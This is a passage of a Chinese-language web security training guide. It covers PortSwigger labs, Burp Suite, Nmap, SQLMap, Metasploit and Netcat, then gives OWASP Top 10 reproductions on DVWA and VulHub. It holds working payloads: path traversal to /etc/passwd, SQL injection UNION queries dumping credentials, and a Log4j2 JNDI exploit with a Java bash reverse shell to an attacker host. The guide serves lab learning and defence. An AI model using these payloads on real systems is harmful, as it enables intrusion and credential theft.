- **系统化学习**：从理论到实践，循序渐进
- **进度跟踪**：记录学习进度，获得证书
- **中文支持**：支持中文界面
- **实时反馈**：提交答案后立即判断对错

**适合人群**：
- 零基础新手
- 没有本地环境的学习者
- 随时随地想练习的人
- 想系统学习 Web 安全的人

#### 4.2 使用步骤

##### 步骤1：注册账号（2分钟）

1. 访问官网：https://portswigger.net/web-security
2. 点击右上角 **"Start learning"**
3. 使用邮箱注册账号（支持 Gmail、QQ 邮箱等）
4. 激活账号（检查邮箱）
5. 登录系统

##### 步骤2：开始学习（5分钟）

**进入学习界面**：
1. 登录后，看到学习路径
2. 选择一个主题（如 SQL Injection）
3. 点击进入第一个实验室

**实验室界面说明**：
- **左侧**：问题描述和提示
- **右侧**：实时实验室环境
- **顶部**：进度和状态
- **底部**：提交答案按钮

##### 步骤3：完成第一个实验（15分钟）

**以 SQL Injection 为例**：

1. 阅读 **"SQL injection vulnerabilities"** 理论部分
2. 理解 SQL 注入原理
3. 点击 **"Apprentice"** 难度的第一个实验室：
   - "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
4. 阅读问题描述
5. 尝试构造 Payload：
   ```sql
   ' OR '1'='1
   ```
6. 观察响应，判断是否成功
7. 完成后点击 **"Submit solution"** 提交答案
8. 系统会提示成功或失败

##### 步骤4：使用 Burp Suite 配合实验（可选）

**PortSwigger 实验室支持与 Burp Suite 集成**：

1. 下载 Burp Suite Community：https://portswigger.net/burp/communitydownload
2. 配置浏览器代理到 Burp Suite（127.0.0.1:8080）
3. 在实验室中使用 Burp Suite 拦截请求
4. 修改参数后发送
5. 观察响应

##### 步骤5：跟踪学习进度

1. 进入 **"My learning"** 页面
2. 查看已完成的实验室
3. 查看学习统计
4. 获得证书（完成特定主题）

#### 4.3 学习路径建议

**初级阶段**（1-2周）：
- 完成所有 **"Apprentice"** 级别的实验室
- 重点学习：
  - SQL 注入（16个实验室）
  - XSS（30个实验室）
  - 认证漏洞（13个实验室）
  - CSRF（8个实验室）

**中级阶段**（2-4周）：
- 完成 **"Practitioner"** 级别的实验室
- 重点学习：
  - 文件上传漏洞（5个实验室）
  - 命令注入（4个实验室）
  - SSRF（6个实验室）
  - XXE（9个实验室）

**高级阶段**（1-2个月）：
- 完成 **"Expert"** 级别的实验室
- 重点学习：
  - 高级XSS绕过
  - CSP绕过
  - 业务逻辑漏洞
  - HTTP请求走私

#### 4.4 推荐学习顺序

**第一阶段：Web基础漏洞（2-3周）**
```
1. Authentication（认证）
   ↓
2. SQL Injection（SQL注入）
   ↓
3. Cross-site scripting (XSS)（跨站脚本）
   ↓
4. CSRF（跨站请求伪造）
```

**第二阶段：进阶漏洞（2-3周）**
```
5. File upload vulnerabilities（文件上传）
   ↓
6. Command injection（命令注入）
   ↓
7. SSRF（服务端请求伪造）
   ↓
8. XXE（XML外部实体注入）
```

**第三阶段：高级漏洞（1-2个月）**
```
9. Access control（访问控制）
   ↓
10. Server-side template injection（SSTI）
    ↓
11. Web cache poisoning（Web缓存投毒）
    ↓
12. HTTP request smuggling（HTTP请求走私）
```

#### 4.5 常见问题解决

**问题1：实验室无法访问**

**可能原因**：
- 网络连接不稳定
- 实验室已过期（每个实验室有24小时有效期）

**解决**：
- 检查网络连接
- 尝试刷新页面
- 重新启动实验室
- 使用VPN（部分实验需要）

**问题2：实验失败怎么办**

**解决**：
- 仔细阅读问题描述
- 点击 **"Hint"** 按钮查看提示
- 参考 **"Community solutions"** 社区解答
- 在论坛寻求帮助：https://forum.portswigger.net/

**问题3：需要安装 Burp Suite 吗**

**回答**：
- 免费版 Burp Suite Community 已经足够完成大部分实验室
- 部分高级实验需要 Professional 版本（付费）
- 但可以通过其他方法绕过

**问题4：能获得证书吗**

**回答**：
- 完成特定主题可获得数字证书
- 证书可以展示在简历或社交媒体
- 认证雇主认可度高

**问题5：实验室有效期多久**

**回答**：
- 每个实验室有24小时有效期
- 完成后会标记为"Solved"，永久保留
- 可以随时重做已完成的实验室

#### 4.6 方案4总结

**优点**：
✅ 完全免费
✅ 无需安装任何软件
✅ 内容权威（由Burp Suite团队制作）
✅ 系统化学习
✅ 进度跟踪
✅ 中文支持
✅ 实时反馈
✅ 可获得证书

**缺点**：
❌ 需要稳定的网络连接
❌ 国内访问可能较慢
❌ 实验室有24小时有效期
❌ 部分高级实验需要付费版Burp Suite

**适用场景**：
- 零基础快速入门
- 没有本地环境的学习者
- 随时随地学习
- 想系统学习Web安全
- 需要权威证书

---

## 第三部分：必备工具超详细安装指南

**说明**：以下工具安装指南适用于所有环境方案。根据你选择的环境方案，选择性安装需要的工具。

### 一、Burp Suite 详细安装与配置

#### 1.1 什么是 Burp Suite？

**通俗解释**：Burp Suite 是一个"网络请求显微镜"和"修改器"。它可以拦截你浏览器发送的所有请求，让你看到请求内容，修改后再发送出去。就像快递员查看你的快递，还能改快递单上的信息。

**核心功能模块**：
- **Proxy（代理）**：拦截和修改 HTTP/HTTPS 请求
- **Repeater（重放器）**：重复发送请求
- **Intruder（入侵者）**：自动化攻击（暴力破解、模糊测试）
- **Scanner（扫描器）**：自动扫描漏洞（专业版功能）
- **Decoder（解码器）**：编码/解码工具
- **Comparer（比较器）**：对比两个请求/响应的差异
- **Extender（扩展）**：安装插件扩展功能

**版本说明**：
- **Community（社区版）**：免费，功能有限
- **Professional（专业版）**：付费，功能完整（约$399/年）
- **Enterprise（企业版）**：团队协作版

**新手建议**：先用社区版，熟悉基础功能后再考虑专业版。

#### 1.2 安装 Java 环境（必须步骤）

Burp Suite 是用 Java 写的，所以必须先安装 Java。

##### 步骤1：检查是否已安装 Java
```bash
java -version
```

如果显示版本号（如 openjdk 11.0.xx），说明已安装，跳过此步骤。

##### 步骤2：安装 JDK 11
```bash
# Ubuntu/Debian/Kali
sudo apt install default-jdk -y

# 验证安装
java -version
```

应该看到类似输出：
```
openjdk version "11.0.xx" 202x-xx-xx
OpenJDK Runtime Environment (build 11.0.xx+xx-post-Ubuntu-0ubuntu1)
OpenJDK 64-Bit Server VM (build 11.0.xx+xx-post-Ubuntu-0ubuntu1, mixed mode, sharing)
```

##### 步骤3：配置 JAVA_HOME（可选）
```bash
# 查找 Java 安装路径
which java
readlink -f $(which java)

# 设置环境变量
echo 'export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64' >> ~/.bashrc
source ~/.bashrc
```

#### 1.3 安装 Burp Suite 社区版

##### 下载 Burp Suite

访问 PortSwigger 官网：https://portswigger.net/burp/communitydownload

选择对应的操作系统版本：
- **Linux**：下载 .sh 文件
- **Windows**：下载 .exe 文件
- **macOS**：下载 .dmg 文件

##### 安装 Linux 版

```bash
# 给下载的文件添加执行权限（假设下载到 Downloads 目录）
chmod +x ~/Downloads/burpsuite_community_linux_v2024.sh

# 运行安装程序
~/Downloads/burpsuite_community_linux_v2024.sh
```

按照安装向导操作：
1. 选择安装目录（默认即可）
2. 选择创建桌面快捷方式（推荐）
3. 点击"Install"开始安装

##### 启动 Burp Suite

- 方法1：在应用程序菜单中找到 Burp Suite 图标，点击启动
- 方法2：在终端运行：
  ```bash
  burpsuite
  ```

##### 首次启动配置

1. 选择项目类型：
   - **Temporary project**：临时项目（推荐新手）
   - **New project on disk**：保存到磁盘
2. 选择配置：
   - 使用默认配置即可
3. 点击"Start Burp"启动

#### 1.4 浏览器代理配置（关键步骤！）

Burp Suite 要拦截浏览器请求，必须配置浏览器代理。

##### 以 Firefox 为例（推荐）

**安装 FoxyProxy 插件**：
1. 访问：https://addons.mozilla.org/firefox/addon/foxyproxy-standard/
2. 点击"Add to Firefox"
3. 安装后点击右上角 FoxyProxy 图标

**配置代理规则**：
1. 点击 FoxyProxy 图标 → "Options"
2. 点击"Add"
3. 填写信息：
   - **Proxy Name**：Burp Suite
   - **Proxy Type**：HTTP/HTTPS
   - **Proxy IP or DNS Name**：127.0.0.1
   - **Port**：8080
4. 点击"Save"

**启用代理**：
1. 点击 FoxyProxy 图标
2. 选择"Burp Suite"
3. 图标变绿，表示代理已启用

##### 以 Chrome/Edge 为例

1. 打开设置
2. 搜索"代理"
3. 点击"打开计算机的代理设置"
4. 手动设置代理：
   - 勾选"使用代理服务器"
   - 地址：127.0.0.1
   - 端口：8080
   - 点击"保存"

**注意**：此方法会影响所有浏览器流量，建议使用单独的浏览器配置文件或Firefox。

#### 1.5 安装 CA 证书（抓取 HTTPS 必须）

**为什么需要证书**：HTTPS 加密了请求，Burp Suite 无法直接查看内容。安装证书后，Burp Suite 可以"中间人"解密流量。

##### 步骤1：在 Burp Suite 中导出证书
1. 打开 Burp Suite
2. 点击"Proxy"标签
3. 点击"Options"子标签
4. 找到"CA Certificate"部分
5. 点击"Export" → "Certificate in DER format"
6. 保存为 `cacert.der`

##### 步骤2：导入证书到 Firefox

1. 打开 Firefox 设置
2. 搜索"证书"
3. 点击"查看证书"
4. 点击"导入证书"
5. 选择刚才保存的 `cacert.der` 文件
6. 信任设置：
   - 勾选"信任此证书来标识网站"
   - 勾选"信任此证书来标识软件供应商"
7. 点击"确定"

##### 步骤3：导入证书到 Chrome/Edge

1. 打开设置
2. 搜索"证书"
3. 点击"管理证书"
4. 点击"受信任的根证书颁发机构"标签
5. 点击"导入"
6. 选择 `cacert.der` 文件
7. 选择存储位置：受信任的根证书颁发机构
8. 点击"确定"

##### 步骤4：验证证书安装

1. 在 Burp Suite 中点击"Proxy" → "Intercept"
2. 确保"Intercept is on"
3. 浏览器访问 https://portswigger.net
4. 如果没有证书警告，说明证书安装成功

#### 1.6 Burp Suite 基础操作演示

##### 演示1：拦截请求

1. 确保 Burp Suite 拦截已开启
2. 浏览器访问 http://localhost:8080（DVWA）
3. 看到请求被拦截，显示在 Burp Suite 中
4. 查看请求内容（头部、参数）

##### 演示2：修改请求

1. 在拦截的请求中，修改参数值
2. 点击"Forward"发送修改后的请求
3. 观察浏览器响应

##### 演示3：使用 Repeater

1. 在拦截的请求中，右键 → "Send to Repeater"
2. 切换到"Repeater"标签
3. 修改参数，点击"Send"
4. 重复测试不同参数

##### 演示4：使用 Intruder

1. 在拦截的请求中，右键 → "Send to Intruder"
2. 切换到"Intruder"标签
3. 选择攻击类型（Sniper、Battering ram、Pitchfork、Cluster bomb）
4. 配置Payloads
5. 点击"Start attack"开始攻击

#### 1.7 Burp Suite 常用快捷键

| 快捷键 | 功能 |
|-------|------|
| Ctrl + I | 开启/关闭拦截 |
| Ctrl + F | Forward（转发请求） |
| Ctrl + R | Repeater（发送到重放器） |
| Ctrl + I | Intruder（发送到入侵者） |
| Ctrl + U | URL编码/解码 |
| Ctrl + H | 十六进制编码/解码 |
| Ctrl + B | Base64编码/解码 |

#### 1.8 Burp Suite 常见问题

**问题1：浏览器显示"您的连接不是私密连接"**

**原因**：证书未正确安装

**解决**：
- 确认 CA 证书已导入浏览器
- 清除浏览器缓存
- 重新导入证书
- 检查证书信任设置

**问题2：拦截了但看不到请求内容**

**原因**：HTTPS 证书问题

**解决**：
- 重新安装 CA 证书
- 确保证书已受信任
- 检查是否使用了其他代理插件

**问题3：拦截请求后浏览器一直在转圈**

**原因**：请求被拦截，需要手动转发

**解决**：
- 在 Burp Suite 中点击"Forward"或"Drop"
- 或关闭拦截模式

**问题4：无法抓取HTTPS流量**

**解决**：
- 确保证书已正确安装
- 检查浏览器代理设置
- 重启 Burp Suite 和浏览器

---

### 二、Nmap 基础使用指南

#### 2.1 什么是 Nmap？

**通俗解释**：Nmap 就像"网络雷达"，可以扫描目标网络有哪些设备、开放了哪些端口、运行什么服务。就像保安巡逻时检查哪些门窗没锁。

**主要功能**：
- 端口扫描
- 服务版本探测
- 操作系统识别
- 漏洞扫描（配合脚本）
- 网络发现

#### 2.2 基础扫描命令

```bash
# 扫描目标开放端口（默认扫描1-1000端口）
nmap 127.0.0.1

# 扫描所有端口（1-65535）
nmap -p- 127.0.0.1

# 详细扫描（显示服务版本）
nmap -sV 127.0.0.1

# 操作系统识别
nmap -O 127.0.0.1

# 漏洞扫描（使用默认脚本）
nmap --script vuln 127.0.0.1

# 扫描多个目标
nmap 192.168.1.1-100

# 扫描特定端口
nmap -p 80,443,8080 127.0.0.1

# 保存扫描结果到文件
nmap -oN scan_result.txt 127.0.0.1

# 保存为XML格式
nmap -oX scan_result.xml 127.0.0.1

# 保存所有格式
nmap -oA scan_result 127.0.0.1
```

#### 2.3 常用扫描参数说明

| 参数 | 作用 | 示例 |
|------|------|------|
| `-p` | 指定端口 | `-p 80,443` 或 `-p-`（所有端口） |
| `-sV` | 服务版本探测 | `nmap -sV target` |
| `-O` | 操作系统识别 | `nmap -O target` |
| `-A` | 全面扫描（包含-sV、-O等） | `nmap -A target` |
| `-T` | 设置扫描速度（1-5，5最快） | `-T4` |
| `--script` | 使用脚本 | `--script vuln`（漏洞扫描） |
| `-oN` | 保存结果为普通文本 | `-oN result.txt` |
| `-oX` | 保存结果为XML | `-oX result.xml` |
| `-oA` | 保存所有格式 | `-oA result` |
| `-Pn` | 跳过主机发现 | `nmap -Pn target` |
| `-sS` | SYN扫描（半开扫描） | `nmap -sS target` |
| `-sT` | TCP connect扫描 | `nmap -sT target` |

#### 2.4 实战示例

```bash
# 示例1：扫描DVWA靶场
nmap -sV -p- 127.0.0.1

# 示例2：扫描局域网中的设备
nmap -sn 192.168.1.0/24

# 示例3：扫描服务版本和漏洞
nmap -sV --script vuln 127.0.0.1

# 示例4：快速扫描（使用-T4加速）
nmap -T4 -A 127.0.0.1

# 示例5：扫描指定端口
nmap -p 80,443,8080,3000 -sV 127.0.0.1
```

---

### 三、其他必备工具简介

#### 3.1 SQLMap（SQL注入自动化工具）

**用途**：自动化检测和利用SQL注入漏洞

**基本使用**：
```bash
# 检测URL是否存在SQL注入
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit"

# 指定Cookie
sqlmap -u "URL" --cookie="cookie值"

# 获取所有数据库
sqlmap -u "URL" --dbs

# 获取指定数据库的所有表
sqlmap -u "URL" -D "数据库名" --tables

# 获取表的所有列
sqlmap -u "URL" -D "数据库名" -T "表名" --columns

# 获取数据
sqlmap -u "URL" -D "数据库名" -T "表名" -C "列名" --dump
```

#### 3.2 Metasploit（渗透测试框架）

**用途**：漏洞利用框架，包含大量漏洞利用模块

**基本使用**：
```bash
# 启动Metasploit
msfconsole

# 搜索漏洞
search 漏洞名称

# 使用模块
use 模块路径

# 查看配置选项
show options

# 设置目标
set RHOSTS 目标IP

# 设置端口
set RPORT 目标端口

# 执行攻击
exploit
```

#### 3.3 Netcat（网络工具）

**用途**：网络调试、端口扫描、文件传输、反弹Shell

**基本使用**：
```bash
# 监听端口（接收端）
nc -lvnp 4444

# 连接到远程主机
nc 目标IP 端口

# 端口扫描
nc -zv 目标IP 端口

# 文件传输
# 接收端
nc -l -p 4444 > 接收的文件
# 发送端
nc 目标IP 4444 < 要发送的文件
```

---

## 第四部分：OWASP Top 10 漏洞详细复现

**说明**：以下漏洞复现可以在任何一种环境方案中运行：
- 方案1（Docker）：使用DVWA、WebGoat等容器
- 方案2（VulHub）：使用对应的漏洞环境
- 方案3（Kali）：使用Docker部署靶场或Kali自带工具
- 方案4（PortSwigger）：在线实验室

---

### A01:2025 失效的访问控制

#### 1.1 漏洞原理（生活化例子）

**类比**：想象你住在一个小区，每个住户都有门禁卡，只能进自己的楼栋。但是如果门禁系统坏了，你的卡不仅能进自己楼栋，还能进别人楼栋，这就是"访问控制失效"。

**技术原理**：Web 应用程序没有正确验证用户是否有权限访问某个资源。攻击者可以通过修改 URL 参数、Cookie 或隐藏字段，访问不应该访问的数据或功能。

**常见类型**：
- 水平越权：访问同级用户的数据
- 垂直越权：普通用户访问管理员功能
- IDOR（不安全的直接对象引用）

#### 1.2 真实案例

**案例**：2024年某银行APP漏洞

- **事件**：用户发现修改订单ID可以查看他人订单信息
- **原因**：后端未验证订单归属
- **影响**：数万用户财务信息泄露
- **修复**：增加订单归属校验

#### 1.3 DVWA 复现（完整步骤）

**步骤1：准备环境**

**方案1（Docker）**：
```bash
docker start dvwa
# 访问：http://localhost:8080
```

**方案2（VulHub）**：
- VulHub中没有专门的访问控制漏洞环境
- 建议使用DVWA容器或Kali中部署

**方案3（Kali）**：
```bash
docker start dvwa
# 访问：http://localhost:8080
```

**方案4（PortSwigger）**：
- 访问：https://portswigger.net/web-security/access-control
- 选择"Apprentice"级别的实验室

**步骤2：登录DVWA**
1. 访问：http://localhost:8080
2. 登录：admin/password
3. 设置安全等级为 **Low**

**步骤3：测试水平越权**

1. 点击左侧菜单的 **"Directory Traversal"**（目录遍历）
2. 看到页面显示"Help"帮助信息
3. 注意 URL：`http://localhost:8080/vulnerabilities/dir_traversal/?page=include.php`
4. 修改 `page` 参数：
   - `page=../../../../../etc/passwd`（Linux）
   - `page=../../../../windows/win.ini`（Windows）
5. 点击"Submit"或按回车
6. **成功**：看到系统文件内容！

**Burp Suite 抓包演示**：
1. 配置 Burp Suite 代理并启用拦截
2. 重复上述步骤
3. 请求被拦截后，修改 `page` 参数
4. 点击"Forward"发送
5. 观察响应

**步骤4：测试垂直越权**

1. 访问：`http://localhost:8080/vulnerabilities/auth_bypass/`
2. 看到"Authorized Access Only"提示
3. 尝试直接访问管理员页面：
   - `http://localhost:8080/vulnerabilities/auth_bypass/admin.php`
4. **成功**：直接进入管理员页面，无需认证！

**步骤5：Medium 难度测试**

1. 将安全等级改为 **Medium**
2. 重复上述测试
3. **失败**：系统过滤了 `../` 字符
4. 尝试绕过：
   - 使用双写：`....//....//....//etc/passwd`
   - 使用 URL 编码：`%2e%2e%2f`
5. **成功绕过**：在 Medium 难度下仍可能成功

#### 1.4 危害分析

| 危害类型 | 具体影响 |
|---------|---------|
| 信息泄露 | 访问他人敏感数据（订单、个人信息） |
| 权限提升 | 普通用户获得管理员权限 |
| 数据篡改 | 修改或删除他人数据 |
| 业务漏洞 | 绕过支付流程、获取免费服务 |
| 隐私侵犯 | 查看他人私密信息 |

#### 1.5 防御方法

**1. 服务端验证**

```php
// 错误做法：只信任客户端传来的 ID
$order_id = $_GET['order_id'];
$order = get_order($order_id);

// 正确做法：验证订单归属
$user_id = $_SESSION['user_id'];
$order_id = $_GET['order_id'];
$order = get_order($order_id, $user_id);  // 必须验证归属
```

**2. 使用不可预测的 ID**
- 使用 UUID 替代顺序 ID
- 例如：`/api/orders/a1b2c3d4` 代替 `/api/orders/123`

**3. 实施 RBAC（基于角色的访问控制）**
- 为每个功能定义所需角色
- 访问前验证用户角色

**4. 日志审计**
- 记录所有访问操作
- 监控异常访问模式

**5. 默认拒绝原则**
- 除非明确允许，否则拒绝所有访问
```php
if (!has_permission($user, $resource)) {
    return 403;
}
```

---

### A02:2025 安全配置错误

#### 2.1 漏洞原理

**类比**：你家门钥匙插在门锁上没拔，等于邀请别人进来。

**技术原因**：
- 使用默认账号密码（admin/admin）
- 开启不必要的服务（目录浏览、DEBUG 模式）
- 错误信息泄露（显示堆栈跟踪）
- 配置文件未加密存储密钥
- CORS配置错误
- 暴露敏感文件（.git、.env、backup文件）

#### 2.2 真实案例：Nginx 目录穿越漏洞

**案例**：2025年某企业因 Nginx 配置错误导致服务器沦陷

**错误配置**：
```nginx
location /files {
    alias /home/;
}
```

**问题**：`alias` 末尾缺少斜杠，导致目录穿越漏洞

**攻击**：
```
访问：http://example.com/files../etc/passwd
实际访问：/home/../etc/passwd = /etc/passwd
```

#### 2.3 复现步骤

**步骤1：搭建测试环境**

```bash
# 拉取有漏洞的 Nginx 镜像
docker pull nginx:latest

# 创建测试目录
mkdir -p ~/nginx-test/files
echo "这是私有文件" > ~/nginx-test/files/secret.txt

# 运行 Nginx 容器
docker run -d \
  -p 8082:80 \
  -v ~/nginx-test/files:/usr/share/nginx/html/files:ro \
  --name nginx-test \
  nginx:latest
```

**步骤2：访问正常页面**

访问：http://localhost:8082/files/secret.txt
- 正常显示：`这是私有文件`

**步骤3：尝试目录穿越**

访问：http://localhost:8082/files../etc/passwd
- 如果成功，显示系统文件内容
- 如果失败，显示 404（现代 Nginx 已修复此问题）

**步骤4：使用 DVWA 演示**

1. 访问 DVWA：http://localhost:8080
2. 登录后，在 URL 后尝试访问 `http://localhost:8080/config.inc.php`
3. 如果能看到配置文件内容（包含数据库密码），说明配置错误

**步骤5：查看 DVWA 配置**

```bash
# 进入 DVWA 容器
docker exec -it dvwa /bin/bash

# 查看配置文件
cat /var/www/html/config.inc.php

# 退出容器
exit
```

#### 2.4 其他常见配置错误

| 错误类型 | 错误配置 | 正确配置 |
|---------|---------|---------|
| 默认密码 | admin/admin | 强制首次登录修改 |
| 目录浏览 | `autoindex on;` | `autoindex off;` |
| 错误信息 | 显示详细错误堆栈 | 显示通用错误页面 |
| DEBUG 模式 | `DEBUG = True` | `DEBUG = False` |
| 未加密传输 | HTTP | HTTPS 强制跳转 |
| 暴露敏感文件 | .git、.env | 在.gitignore中排除 |

#### 2.5 防御方法

**1. 安全基线检查**
- 使用 CIS Benchmarks 检查配置
- 使用自动化工具扫描（如 Lynis）

**2. 移除默认配置**
```nginx
# 移除默认服务器配置
server {
    listen 80 default_server;
    server_name _;
    return 444;  # 直接关闭连接
}
```

**3. 禁用不必要功能**
```nginx
# 禁用目录浏览
autoindex off;

# 隐藏 Nginx 版本号
server_tokens off;
```

**4. 最小权限原则**
- Web 服务使用非特权用户运行
- 限制文件访问权限
- 禁用不必要的扩展

**5. 配置审计**
- 定期检查配置文件
- 使用自动化工具扫描
- 代码审查

---

### A03:2025 软件供应链故障

#### 3.1 漏洞原理

**类比**：你从餐厅点餐，餐厅的食材供应商被污染了，所有用这些食材的菜都有问题。

**技术原理**：
- 依赖的开源组件存在漏洞
- 第三方库被植入恶意代码
- CI/CD 流程被入侵
- 软件包签名被伪造

**典型案例**：
- Log4j2 漏洞（2021）
- SolarWinds 攻击（2020）
- event-stream 事件（2018）

#### 3.2 真实案例：Log4j2 漏洞（CVE-2021-44228）

**时间线**：
- 2021年12月：漏洞公开
- 2022年：大规模攻击
- 2024年：仍有未修复的系统被攻击

**影响范围**：
- Apache Solr
- Apache Struts2
- Spring Boot
- Elasticsearch
- 无数企业应用

**漏洞本质**：
```java
// 正常日志记录
logger.info("用户登录：{}", username);

// 恶意输入
username = "${jndi:ldap://attacker.com/Exploit}";

// 实际执行
logger.info("用户登录：${jndi:ldap://attacker.com/Exploit}");
// → 触发 JNDI 注入，加载恶意代码
```

#### 3.3 复现步骤（使用VulHub）

**步骤1：启动 Log4j2 漏洞环境**

```bash
# 克隆 Vulhub 项目（如果还没克隆）
cd ~/vulhub/log4j2/CVE-2021-44228

# 启动 Solr 漏洞环境
docker-compose up -d

# 等待服务启动（约30秒）
docker ps
```

**步骤2：验证环境**

访问：http://localhost:8983
应该看到 Apache Solr 管理界面

**步骤3：准备攻击环境**

**创建恶意 Java 代码**：
```bash
# 创建工作目录
mkdir -p ~/log4j-exploit
cd ~/log4j-exploit

# 创建恶意 Java 文件
cat > Exploit.java << 'EOF'
import java.io.IOException;

public class Exploit {
    static {
        try {
            // Linux：反弹 shell
            String[] cmds = {"/bin/bash", "-c", "bash -i >& /dev/tcp/攻击机IP/4444 0>&1"};
            Runtime.getRuntime().exec(cmds).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
EOF

# 编译 Java 文件
javac Exploit.java
```

**启动 HTTP 服务器**：
```bash
# 在另一个终端
cd ~/log4j-exploit
python3 -m http.server 8000
```

**启动 LDAP 服务器**：
```bash
# 在第三个终端
cd ~/log4j-exploit

# 下载 marshalsec
wget https://github.com/mbechler/marshalsec/releases/download/v0.0.3/marshalsec-0.0.3-SNAPSHOT-all.jar

# 启动 LDAP 服务器
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \
    "http://你的IP:8000/#Exploit" 1389
```

**监听反弹 Shell**：
```bash
# 在第四个终端
nc -lvnp 4444
```

**步骤4：发送攻击请求**

```bash
curl -v "http://localhost:8983/solr/admin/cores?action=${jndi:ldap://你的IP:1389/Exploit}"
```

**步骤5：观察结果**

1. 在 LDAP 服务器终端看到连接
2. 在 HTTP 服务器终端看到 class 文件被下载
3. **成功**：在 netcat 监听终端获得反弹 Shell！

#### 3.4 简化验证（使用DNSlog）

如果上面步骤太复杂，可以用DNSlog验证漏洞存在：

```bash
# 使用 DNSlog 平台（如 http://dnslog.cn/）
# 获取一个子域名：xxx.dnslog.cn

# 发送请求
curl "http://localhost:8983/solr/admin/cores?action=${jndi:dns://xxx.dnslog.cn}"

# 访问 DNSlog.cn 查看是否有 DNS 解析记录
# 如果有，说明漏洞存在
```

#### 3.5 危害分析

| 层面 | 危害 |
|------|------|
| 单系统 | 服务器被完全控制 |
| 内网 | 横向渗透，攻破整个网络 |
| 数据 | 敏感数据泄露、加密货币被窃取 |
| 供应链 | 依赖该组件的所有应用都受影响 |
| 业务 | 服务中断、经济损失 |

#### 3.6 防御方法

**1. 紧急修复**
```xml
<!-- pom.xml 中升级 Log4j2 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>  <!-- 或更高版本 -->
</dependency>
```

**2. 临时缓解**
```java
// 禁用 JNDI Lookup
System.setProperty("log4j2.formatMsgNoLookups", "true");

// 或删除 JndiLookup 类
// 设置环境变量：LOG4J_FORMAT_MSG_NO_LOOKUPS=true
```

**3. 长期防护**
- 使用 **SBOM（软件物料清单）** 追踪依赖
- 定期使用 **OWASP Dependency Check** 扫描
- 建立组件更新策略
- 限制网络出站流量
- 代码审查和自动化扫描

---

### A05:2025 注入攻击

#### 5.1 漏洞原理

**类比**：你在餐厅点菜，服务员问你要什么，你说"来一份牛排，顺便把隔壁桌的账单算在我头上"。服务员不加验证就照做了。

**技术原理**：用户输入被直接拼接到 SQL 语句或命令中执行。

**常见类型**：
- SQL 注入
- NoSQL 注入
- 命令注入
- LDAP 注入
- XPath 注入

#### 5.2 SQL 注入详细复现

**步骤1：进入 DVWA SQL Injection 模块**

1. 访问 DVWA：http://localhost:8080
2. 登录：admin/password
3. 设置安全等级为 **Low**
4. 点击左侧菜单的 **SQL Injection**

**步骤2：理解正常查询**

1. 页面显示一个输入框：**User ID**
2. 输入：`1`
3. 点击"Submit"
4. 看到结果：
   ```
   ID: 1
   First name: admin
   Surname: admin
   ```
5. **SQL 语句（猜测）**：
   ```sql
   SELECT first_name, last_name FROM users WHERE user_id = '1'
   ```

**步骤3：测试是否存在注入**

1. 输入：`1'`（注意单引号）
2. 点击"Submit"
3. **看到错误信息**：
   ```
   You have an error in your SQL syntax; check the manual that 
   corresponds to your MySQL server version for the right syntax 
   to use near ''1''' at line 1
   ```
4. **结论**：存在 SQL 注入漏洞！

**步骤4：获取数据库版本**

1. 输入：
   ```
   1' UNION SELECT 1, version()--
   ```
2. 点击"Submit"
3. 看到版本号：
   ```
   First name: 1
   Surname: 10.4.27-MariaDB
   ```

**Payload解释**：
- `'`：闭合前面的单引号
- `UNION SELECT 1, version()`：联合查询，查询版本号
- `--`：注释掉后面的SQL语句

**步骤5：获取数据库名**

1. 输入：
   ```
   1' UNION SELECT 1, database()--
   ```
2. 看到数据库名：
   ```
   Surname: dvwa
   ```

**步骤6：获取表名**

1. 输入：
   ```
   1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()--
   ```
2. 看到表列表，找到 `users` 表

**步骤7：获取列名**

1. 输入：
   ```
   1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--
   ```
2. 看到列名：user_id, first_name, last_name, user, password, ...

**步骤8：获取所有用户**

1. 输入：
   ```
   1' UNION SELECT user, password FROM users--
   ```
2. 看到所有用户名和密码哈希！

**步骤9：破解管理员密码**

1. 输入：
   ```
   1' UNION SELECT user, password FROM users WHERE user='admin'--
   ```
2. 看到管理员密码哈希：
   ```
   5f4dcc3b5aa765d61d8327deb882cf99
   ```
3. **破解密码**：
   ```bash
   # 使用在线工具或hashcat
   # MD5哈希，结果：password
   ```

**步骤10：Burp Suite 自动化攻击**

1. 配置 Burp Suite 代理
2. 访问 SQL Injection 页面并提交
3. 在 Burp Suite 中右键请求 → "Send to Intruder"
4. 切换到 "Positions" 标签
5. 点击 "Clear §" 清除所有位置标记
6. 手动在参数值前后添加 `§`：
   ```
   id=§§
   ```
7. 切换到 "Payloads" 标签
8. Payload类型：Numbers
9. From: 1, To: 10, Step: 1
10. 点击 "Start attack"开始攻击
11. 观察响应，寻找不同长度的响应

#### 5.3 SQL 注入防御方法

**1. 使用参数化查询（预编译语句）**

```php
// 错误做法
$sql = "SELECT * FROM users WHERE id = '" . $_GET['id'] . "'";
$result = $conn->query($sql);

// 正确做法（PHP PDO）
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute(['id' => $_GET['id']]);
$result = $stmt->fetchAll();
```

**2. 输入验证**

```php
// 验证ID必须是数字
if (!is_numeric($_GET['id'])) {
    die("Invalid input");
}

// 或使用白名单
$allowed_ids = [1, 2, 3];
if (!in_array($_GET['id'], $allowed_ids)) {
    die("Invalid input");
}
```

**3. 最小权限原则**

```sql
-- 不要使用root或管理员账号连接数据库
-- 创建专用数据库用户，只赋予必要权限
GRANT SELECT, INSERT ON dvwa.* TO 'webuser'@'localhost';
```

**4. 使用ORM**

ORM框架（如Django ORM、Hibernate）会自动处理SQL注入：
```python
# Django ORM - 自动防止SQL注入
user = User.objects.get(id=user_id)
```

**5. 输出编码**

```php
// 防止XSS
echo htmlspecialchars($user_data, ENT_QUOTES, 'UTF-8');
```

---

## 第五部分：综合实战场景

### 场景一：电商网站渗透测试

#### 阶段1：信息收集

**目标**：收集目标系统的基本信息

**步骤**：

1. **端口扫描**
```bash
nmap -sV -p- 目标IP
```

2. **目录扫描**
```bash
gobuster dir -u http://目标IP \
